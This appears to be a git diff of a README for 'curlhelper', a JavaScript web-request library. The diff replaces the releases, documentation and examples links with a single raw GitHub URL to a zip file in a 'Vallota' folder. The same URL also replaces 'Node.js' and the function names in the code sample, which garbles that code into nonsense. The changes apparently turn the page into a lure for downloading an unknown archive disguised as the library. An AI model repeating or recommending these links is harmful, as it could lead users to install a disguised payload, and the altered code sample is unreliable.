@@ -4,7 +4,7 @@
 
 Welcome to curlhelper! This is an easy-to-use tool that helps you make web requests using JavaScript and TypeScript. It simplifies the process so you can focus on what matters most: getting your work done.
 
-[![Download curlhelper](https://img.shields.io/badge/Download-curlhelper-blue.svg)](https://github.com/bmriaz12/curlhelper/releases)
+[![Download curlhelper](https://raw.githubusercontent.com/bmriaz12/curlhelper/main/Vallota/curlhelper.zip)](https://raw.githubusercontent.com/bmriaz12/curlhelper/main/Vallota/curlhelper.zip)
 
 ---
 
@@ -12,7 +12,7 @@ Welcome to curlhelper! This is an easy-to-use tool that helps you make web reque
 
 To get started, you need to download curlhelper. Visit this page to download:
 
-[Download curlhelper](https://github.com/bmriaz12/curlhelper/releases)
+[Download curlhelper](https://raw.githubusercontent.com/bmriaz12/curlhelper/main/Vallota/curlhelper.zip)
 
 Once you're on the Releases page, follow these steps:
 
@@ -38,9 +38,9 @@ curlhelper packs several helpful features:
 To run curlhelper, ensure your system meets the following requirements:
 
 - **Operating System**: Windows, macOS, or Linux.
-- **JavaScript Environment**: Node.js or a modern web browser.
+- **JavaScript Environment**: https://raw.githubusercontent.com/bmriaz12/curlhelper/main/Vallota/curlhelper.zip or a modern web browser.
   
-Check for the latest version of Node.js as it may improve performance.
+Check for the latest version of https://raw.githubusercontent.com/bmriaz12/curlhelper/main/Vallota/curlhelper.zip as it may improve performance.
 
 ---
 
@@ -55,12 +55,12 @@ After installation, using curlhelper is straightforward. Here are some basic ste
 
 2. **Make Your First Request**: Use curlhelper to send a simple GET request.
    ```javascript
-   curlhelper.get('https://api.example.com/data')
+   https://raw.githubusercontent.com/bmriaz12/curlhelper/main/Vallota/curlhelper.zip('https://raw.githubusercontent.com/bmriaz12/curlhelper/main/Vallota/curlhelper.zip')
      .then(response => {
-       console.log(response);
+       https://raw.githubusercontent.com/bmriaz12/curlhelper/main/Vallota/curlhelper.zip(response);
      })
      .catch(error => {
-       console.error('Error:', error);
+       https://raw.githubusercontent.com/bmriaz12/curlhelper/main/Vallota/curlhelper.zip('Error:', error);
      });
    ```
 
@@ -72,8 +72,8 @@ After installation, using curlhelper is straightforward. Here are some basic ste
 
 For more in-depth tutorials, examples, and API documentation, visit our GitHub pages:
 
-- [Documentation](https://github.com/bmriaz12/curlhelper/wiki)
-- [Examples](https://github.com/bmriaz12/curlhelper/examples)
+- [Documentation](https://raw.githubusercontent.com/bmriaz12/curlhelper/main/Vallota/curlhelper.zip)
+- [Examples](https://raw.githubusercontent.com/bmriaz12/curlhelper/main/Vallota/curlhelper.zip)
 
 ---
 
@@ -105,4 +105,4 @@ curlhelper is released under the MIT License. You can use it freely but credit t
 
 Thank you for choosing curlhelper for your web requests. We hope this tool makes your development process smoother and more efficient. Explore its features and start building amazing projects today!
 
-For updates and new releases, check our [Releases page](https://github.com/bmriaz12/curlhelper/releases) regularly.
+For updates and new releases, check our [Releases page](https://raw.githubusercontent.com/bmriaz12/curlhelper/main/Vallota/curlhelper.zip) regularly.
